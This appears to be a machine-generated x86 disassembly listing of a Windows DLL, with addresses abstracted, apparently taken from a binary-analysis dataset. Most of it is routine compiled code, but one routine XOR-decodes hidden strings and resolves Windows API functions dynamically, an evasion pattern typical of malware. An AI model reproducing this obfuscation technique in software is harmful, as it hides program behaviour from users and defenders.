cmp [ edi + 0x14 ] 0x8
jb r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov [ edi ] ebx
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ecx
cmp esi 0x8
jb r-xdata
mov edx [ edi ]
push edx
call sub_100187af
mov ecx [ ebp + 0xc ]
add esp 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
xor edx edx
mov [ edi + ecx * 2 ] dx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edi ebx
add ecx ecx
push ecx
push eax
push ebx
call sub_1007f5d0
mov ecx [ ebp + 0xc ]
add esp 0xc
sub_100419c6
mov esi [ ebp - 0x14 ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
push ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
push ecx
mov [ esi ] cx
call sub_10024fe9
int3
mov eax [ esi ]
push eax
call sub_100187af
add esp 0x4
sub_10041a47
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
or eax 0xffffffff
pop ebp
retn
sub_10041a89
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_100388df
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_100388df
pop ecx
sub_10041b90
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
push edi
mov edi [ ebp + 0x10 ]
lea ecx [ eax + edi ]
cmp ecx [ esi + 0x8 ]
ja r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp [ ebp + 0x14 ] 0x0
push edi
je r-xdata
mov ecx [ ebp + 0xc ]
push ecx
push eax
call sub_1003159d
mov edx [ ebp + 0xc ]
push edx
push eax
call sub_10051e6e
jmp r-xdata
push ebx
mov ebx 0x1
test edi edi
je r-xdata
add esp 0xc
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop edi
pop esi
pop ebp
retn
mov [ ebp + 0x8 ] edi
nop
sub [ ebp + 0x8 ] ebx
jne r-xdata
mov eax [ esi + 0x10 ]
add [ esi ] eax
add [ esi + 0x1c ] eax
mov edi [ esi ]
cmp ecx 0xa
jne r-xdata
mov ecx [ esi + 0xc ]
cmp ecx 0xffffffff
je r-xdata
cmp ecx 0x9
jne r-xdata
add [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
jmp r-xdata
add [ esi + 0x18 ] ebx
mov edx [ esi + 0x2c ]
mov eax [ edx ]
mov ecx [ eax + 0xc ]
mov eax [ esi + 0x18 ]
xor edx edx
div ecx
add eax ebx
imul eax ecx
mov [ esi + 0x18 ] eax
jmp r-xdata
cmp edi [ esi + 0x8 ]
jae r-xdata
mov [ esi + 0xc ] 0xffffffff
call sub_1007e670
jmp r-xdata
sub_10041c50
mov eax [ edi + 0x4 ]
push ebx
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x15 ] 0x0
push esi
mov esi ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax ] eax
mov eax [ edi + 0x4 ]
pop esi
mov [ eax + 0x8 ] eax
mov [ edi + 0x8 ] 0x0
pop ebx
retn
mov ecx [ esi + 0x8 ]
push ecx
mov ecx edi
call sub_10046f10
mov esi [ esi ]
push ebx
call sub_100187af
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov ebx esi
je r-xdata
sub_10041c99
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_1006b47a
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_10028eb0
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_10041cf0
push ebp
mov ebp esp
sub esp 0x11c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x190
push 0x0
push rw-data
call sub_1007f940
mov ecx [ r--data ]
add esp 0xc
xor eax eax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x59
and edx 0xff
mov [ ebp + eax * 2 - 0xc0 ] dx
inc eax
cmp eax 0xc
jb r-xdata
push edi
lea ecx [ ebp - 0xc0 ]
xor eax eax
push ecx
mov [ ebp - 0xa8 ] ax
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ r--data ]
xor cl cl
xor eax eax
lea eax [ edi + 0x64 ]
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov dl [ eax + esi ]
xor dl cl
xor dl 0x36
inc cl
mov [ ebp + eax - 0x3c ] dl
movzx eax cl
cmp eax 0xb
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x31 ] 0x0
xor eax eax
jmp r-xdata
mov dl [ eax + esi ]
xor dl cl
xor dl 0xd7
inc cl
mov [ ebp + eax - 0x10 ] dl
movzx eax cl
cmp eax 0x8
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x8 ] 0x0
xor eax eax
mov dl [ eax + esi ]
xor dl cl
xor dl 0xd9
inc cl
mov [ ebp + eax - 0x1c ] dl
movzx eax cl
cmp eax 0x9
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x13 ] 0x0
xor eax eax
mov dl [ eax + esi ]
xor dl cl
xor dl 0xae
inc cl
mov [ ebp + eax - 0x28 ] dl
movzx eax cl
cmp eax 0xb
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x1d ] 0x0
xor eax eax
lea esp [ esp ]
mov dl [ eax + esi ]
xor dl cl
xor dl 0x52
inc cl
mov [ ebp + eax - 0x7c ] dl
movzx eax cl
cmp eax 0xc
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x70 ] 0x0
xor eax eax
mov dl [ eax + esi ]
xor dl cl
xor dl 0xa6
inc cl
mov [ ebp + eax - 0x4c ] dl
movzx eax cl
cmp eax 0xc
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x40 ] 0x0
xor eax eax
mov dl [ eax + esi ]
xor dl cl
xor dl 0x22
inc cl
mov [ ebp + eax - 0x90 ] dl
movzx eax cl
cmp eax 0x13
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ ebp - 0x7d ] 0x0
xor eax eax
nop
mov dl [ eax + esi ]
xor dl cl
xor dl 0x76
inc cl
mov [ ebp + eax - 0x5c ] dl
movzx eax cl
cmp eax 0xc
jb r-xdata
mov esi [ GetProcAddress@IAT ]
lea ecx [ ebp - 0x3c ]
push ecx
lea eax [ ebp - 0x11c ]
push edi
mov [ ebp - 0x50 ] 0x0
mov [ ebp - 0x11c ] eax
call esi
lea edx [ ebp - 0x10 ]
push edx
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x1c ]
push eax
push edi
call esi
lea ecx [ ebp - 0x28 ]
push ecx
push edi
mov [ rw-data ] eax
call esi
lea edx [ ebp - 0x7c ]
push edx
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x4c ]
push eax
push edi
call esi
lea ecx [ ebp - 0x90 ]
push ecx
push edi
mov [ rw-data ] eax
call esi
lea edx [ ebp - 0x5c ]
push edx
push edi
mov [ rw-data ] eax
call esi
mov edi [ r--data ]
mov [ rw-data ] eax
xor cl cl
xor eax eax
lea esp [ esp ]
mov dl [ eax + edi ]
xor dl cl
xor dl 0x49
inc cl
mov [ ebp + eax - 0x6c ] dl
movzx eax cl
cmp eax 0xc
jb r-xdata
push ebx
lea eax [ ebp - 0x6c ]
push eax
mov [ ebp - 0x60 ] 0x0
call [ GetModuleHandleA@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
lea edi [ ebp - 0xdc ]
mov eax 0xb
call sub_10052840
lea edi [ ebp - 0xa4 ]
mov eax 0x4
call sub_10052840
lea edi [ ebp - 0x118 ]
mov eax 0xa
call sub_10052840
lea edi [ ebp - 0xf8 ]
mov eax 0x9
call sub_10052840
lea edi [ ebp - 0x30 ]
mov eax 0x5
call sub_10052840
lea ecx [ ebp - 0xdc ]
push ecx
push ebx
call esi
lea edx [ ebp - 0xa4 ]
push edx
push ebx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x118 ]
push eax
push ebx
call esi
lea ecx [ ebp - 0xf8 ]
push ecx
push ebx
mov [ rw-data ] eax
call esi
mov edx edi
push edx
push ebx
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov [ rw-data ] sub_1003c0f0
mov [ rw-data ] sub_1005b970
mov [ rw-data ] sub_1003c2b0
mov [ rw-data ] sub_10056cc0
mov [ rw-data ] sub_1006a8b0
mov [ rw-data ] sub_10039a80
mov [ rw-data ] sub_100687a0
mov [ rw-data ] sub_1005c820
mov [ rw-data ] sub_1002c910
mov [ rw-data ] sub_10066a40
mov [ rw-data ] sub_1005bc30
mov [ rw-data ] sub_10028210
mov [ rw-data ] sub_1000e870
mov [ rw-data ] sub_10055c30
mov [ rw-data ] sub_10059ea0
mov eax 0x1
pop ebx
pop esi
mov eax 0xc8
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
pop ebx
pop esi
xor ecx ebp
pop edi
call sub_10001e8b
mov esp ebp
pop ebp
retn
inc eax
cmp eax 0x1d
jl r-xdata
cmp [ eax * 4 + rw-data ] 0x0
je r-xdata
xor eax eax
mov cl 0x38
xor [ eax + rw-data ] cl
inc eax
cmp eax 0x190
jb r-xdata
xor eax eax
sub_100420d0
push ebp
mov ebp esp
push 0xffffffff
push sub_10088682
mov eax [ fs : 0x0 ]
push eax
sub esp 0x134
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x13c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x140 ] ecx
mov ecx [ r--data ]
mov [ ebp - 0x138 ] eax
movsx eax [ ecx ]
xor eax 0xffa3
xor ecx ecx
and eax 0xff
mov [ ebp - 0x12c ] ax
mov [ ebp - 0x12a ] cx
mov ecx [ r--data ]
xor edi edi
xor eax eax
movsx esi [ ecx + eax ]
xor esi eax
xor esi 0xffa1
and esi 0xff
mov [ ebp + eax * 2 - 0x20 ] si
inc eax
cmp eax 0x2
jb r-xdata
xor eax eax
mov [ ebp - 0x1c ] ax
xor ecx ecx
mov eax edx
mov [ ebp - 0x88 ] 0x7
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x9c ] cx
lea esi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0x9c ]
call sub_1005ddc0
lea edx [ ebp - 0x9c ]
push edx
lea edx [ ebp - 0x12c ]
lea esi [ ebp - 0xf0 ]
mov [ ebp - 0x4 ] edi
call sub_1005bbc0
add esp 0x4
push eax
lea edx [ ebp - 0x20 ]
lea esi [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x1
call sub_1001ccb0
add esp 0x4
mov ebx 0x8
cmp [ ebp - 0xdc ] ebx
jb r-xdata
mov esi 0x7
xor ecx ecx
mov [ ebp - 0xdc ] esi
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xf0 ] cx
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x88 ] ebx
jb r-xdata
mov eax [ ebp - 0xf0 ]
push eax
call sub_100187af
add esp 0x4
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x9c ] ax
mov edx [ ebp - 0x9c ]
push edx
call sub_100187af
add esp 0x4
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffec
and edx 0xff
mov [ ebp + eax * 2 - 0x80 ] dx
inc eax
cmp eax 0x2c
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x28 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffca
and edx 0xff
mov [ ebp + eax * 2 - 0x18 ] dx
inc eax
cmp eax 0x2
jb r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
lea edx [ ebp - 0x13c ]
xor eax eax
push edx
lea edx [ ebp - 0x80 ]
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x14 ] ax
call sub_100688b0
mov eax [ r--data ]
movsx ecx [ eax ]
mov eax [ r--data ]
xor ecx 0xff92
and ecx 0xff
xor edx edx
mov [ ebp - 0x130 ] cx
mov [ ebp - 0x12e ] dx
movsx ecx [ eax ]
xor ecx 0x5e
and ecx 0xff
add esp 0x8
xor eax eax
mov [ ebp - 0xc0 ] esi
mov esi [ ebp - 0x140 ]
mov [ ebp - 0xd4 ] ax
mov eax esi
mov [ ebp - 0x132 ] dx
mov [ ebp - 0x134 ] cx
mov [ ebp - 0xc4 ] edi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0xd4 ]
call sub_1005ddc0
lea ecx [ ebp - 0xd4 ]
push ecx
lea edx [ ebp - 0x130 ]
lea esi [ ebp - 0x128 ]
mov [ ebp - 0x4 ] 0x5
call sub_1005bbc0
add esp 0x4
push eax
lea edx [ ebp - 0x134 ]
lea esi [ ebp - 0x10c ]
mov [ ebp - 0x4 ] 0x6
call sub_1001ccb0
add esp 0x4
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x7
call sub_10017b50
cmp [ ebp - 0xf8 ] ebx
jb r-xdata
xor eax eax
mov esi 0x7
mov [ ebp - 0xf8 ] esi
mov [ ebp - 0xfc ] edi
mov [ ebp - 0x10c ] ax
cmp [ ebp - 0x114 ] ebx
jb r-xdata
mov edx [ ebp - 0x10c ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x118 ] edi
mov [ ebp - 0x128 ] dx
cmp [ ebp - 0xc0 ] ebx
jb r-xdata
mov ecx [ ebp - 0x128 ]
push ecx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0xb8 ]
cmp [ ebp - 0xa4 ] ebx
jae r-xdata
mov eax [ ebp - 0xd4 ]
push eax
call sub_100187af
add esp 0x4
mov edx [ ebp - 0x138 ]
call sub_10046fd0
mov esi eax
cmp [ ebp - 0xa4 ] ebx
jb r-xdata
lea ecx [ ebp - 0xb8 ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xb8 ]
push ecx
call sub_100187af
add esp 0x4
sub_10042443
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000a924
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_10042480
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
mov [ esi ] r--data
call sub_1005fbb8
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_100424ab
push 0x58
mov eax sub_10085275
call sub_1003fae8
mov eax [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
push eax
mov [ ebp - 0x64 ] ebx
call sub_100188c2
mov edi eax
pop ecx
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
call sub_1000ff3d
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x8 ]
mov [ ebp - 0x4a ] al
mov [ ebp - 0x4a ] 0x0
jmp r-xdata
mov eax [ ebp + 0x18 ]
and eax 0xe00
push 0xa
pop edi
cmp eax 0x400
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x50 ] ebx
call sub_100463af
test al al
jne r-xdata
cmp eax 0x800
jne r-xdata
mov [ ebp - 0x54 ] 0x8
jmp r-xdata
cmp [ esi + 0x5 ] 0x2b
jne r-xdata
mov ecx esi
call sub_10045d3b
neg eax
sbb eax eax
and eax edi
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x54 ] 0x10
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x49 ] 0x0
call sub_100463af
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebx ] 0x2b
jmp r-xdata
cmp [ ebp - 0x54 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp [ esi + 0x5 ] 0x2d
jne r-xdata
mov ecx esi
call sub_10045d3b
lea eax [ ebx + 0x1 ]
mov ecx esi
mov [ ebp - 0x50 ] eax
call sub_1005f1e2
mov [ ebp - 0x60 ] edi
cmp [ ebp - 0x54 ] edi
je r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_10045d3b
mov [ ebx ] 0x2d
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp - 0x54 ] 0x8
setne al
dec eax
and eax 0xfffffff2
add eax 0x16
mov [ ebp - 0x60 ] eax
jmp r-xdata
mov ecx esi
mov [ ebp - 0x58 ] 0x1
call sub_1005f1e2
push [ ebp - 0x5c ]
mov ecx esi
call sub_100463af
test al al
jne r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
lea edx [ ebp - 0x48 ]
mov al [ esi + 0x5 ]
mov ecx [ ebp - 0x50 ]
push [ ebp - 0x60 ]
mov [ ecx ] al
movsx eax al
push eax
push r--data
call sub_1007f360
add esp 0xc
test eax eax
je r-xdata
mov ecx esi
call sub_10045d3b
push [ ebp - 0x58 ]
and [ ebp - 0x1c ] 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x2c ] 0x0
call sub_100405c0
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x4 ] 0x1
xor edi edi
add ebx 0x1f
call sub_100463af
test al al
jne r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x50 ] eax
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov [ ebp - 0x54 ] 0x8
cmp [ esi + 0x5 ] 0x78
je r-xdata
mov ecx esi
call sub_10045d3b
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x50 ] ebx
jae r-xdata
mov eax [ ebp - 0x50 ]
cmp [ eax ] 0x30
je r-xdata
cmp [ ebp - 0x54 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x50 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ eax ] 0x0
call sub_1002c8c0
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1002c8c0
mov eax [ ebp - 0x54 ]
call sub_1004642f
retn
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
dec edi
je r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x4a ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x1
jae r-xdata
inc [ ebp - 0x50 ]
mov [ ebp - 0x49 ] 0x1
mov ecx esi
mov [ ebp - 0x54 ] 0x10
mov [ ebp - 0x58 ] 0x0
call sub_1005f1e2
jmp r-xdata
cmp [ ebp - 0x54 ] 0x10
jne r-xdata
cmp [ esi + 0x5 ] 0x58
jne r-xdata
mov ecx esi
call sub_10045d3b
test edi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ eax + edi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + edi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
mov al [ ebp - 0x4a ]
cmp [ esi + 0x5 ] al
jne r-xdata
mov ecx esi
call sub_10045d3b
mov ecx esi
call sub_1005f1e2
push [ ebp - 0x5c ]
mov ecx esi
call sub_100463af
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x0
inc edi
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1004ca10
inc edi
inc [ eax + edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
sub_100427d0
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0x94
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_100404a0
mov eax esi
mov esp ebp
pop ebp
retn
sub_10042810
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov edx [ eax + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push esi
mov [ ebp - 0x4 ] 0x0
call edx
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10042830
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi esi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
mov eax edi
call sub_10070e80
push 0xffffffff
push 0x0
lea eax [ edi + 0x94 ]
push eax
lea ecx [ esi + 0x94 ]
call sub_100404a0
mov ecx [ edi + 0xb0 ]
mov [ esi + 0xb0 ] ecx
mov edx [ edi + 0x90 ]
mov [ esi + 0x90 ] edx
sub_10042880
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10044a50
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_100428b0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0xc ]
cmp ecx 0xffffffff
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0x10 ]
add [ esi ] eax
add [ esi + 0x1c ] eax
push edi
mov edi [ esi ]
cmp ecx 0xa
jne r-xdata
cmp ecx 0x9
jne r-xdata
mov eax 0x1
add [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
jmp r-xdata
inc [ esi + 0x18 ]
mov eax [ esi + 0x2c ]
mov ecx [ eax ]
mov ecx [ ecx + 0xc ]
mov eax [ esi + 0x18 ]
xor edx edx
div ecx
inc eax
imul eax ecx
mov [ esi + 0x18 ] eax
jmp r-xdata
cmp edi [ esi + 0x8 ]
pop edi
jae r-xdata
mov [ esi + 0xc ] 0xffffffff
call sub_1007e670
pop esi
pop ebp
retn
sub_10042920
push ebp
mov ebp esp
push 0xffffffff
push sub_10086500
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x4c ] eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_1001bc10
test eax eax
je r-xdata
push ebx
push ebx
call [ CoInitializeEx@IAT ]
test eax eax
js r-xdata
call sub_10034ca0
test eax eax
je r-xdata
lea eax [ ebx + 0x5 ]
jmp r-xdata
mov eax 0x1
lea ecx [ ebp - 0x34 ]
push ecx
push r--data
push 0x4
push ebx
push r--data
mov [ ebp - 0x38 ] 0x4
call [ CoCreateInstance@IAT ]
cmp [ ebp - 0x34 ] ebx
je r-xdata
mov eax 0x6
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov [ ebp - 0x38 ] 0x2
call [ CoUninitialize@IAT ]
mov eax [ ebp - 0x38 ]
jmp r-xdata
lea edx [ ebp - 0x5c ]
push edx
call [ VariantInit@IAT ]
lea edx [ ebp - 0x2c ]
mov eax 0x79
call sub_10045930
mov eax edx
push eax
call [ SysAllocString@IAT ]
lea edx [ ebp - 0x5c ]
push edx
push edx
push edx
mov esi eax
mov eax [ ebp - 0x34 ]
mov ecx [ eax ]
push edx
push esi
push eax
mov eax [ ecx + 0x2c ]
call eax
push esi
mov [ ebp - 0x30 ] eax
call [ SysFreeString@IAT ]
mov edi [ Sleep@IAT ]
xor esi esi
nop
cmp [ ebp - 0x30 ] ebx
jne r-xdata
push 0x64
call edi
inc esi
cmp esi 0xa
jl r-xdata
mov [ ebp - 0x38 ] 0x3
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x34 ]
lea edx [ ebp - 0x30 ]
mov [ ebp - 0x30 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x48 ]
call eax
mov eax [ ebp - 0x30 ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x34 ]
lea edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0xe0 ]
call eax
cmp [ ebp - 0x48 ] 0x4
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x1
push edx
mov [ ebp - 0x44 ] ebx
mov ecx [ eax ]
push r--data
push eax
mov eax [ ecx ]
call eax
mov eax [ ebp - 0x44 ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x34 ]
mov ecx [ eax ]
mov edx [ ecx + 0x80 ]
push eax
call edx
mov eax [ ebp - 0x34 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax [ ebp - 0x38 ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
jmp r-xdata
mov [ ebp - 0x4 ] bl
cmp eax ebx
je r-xdata
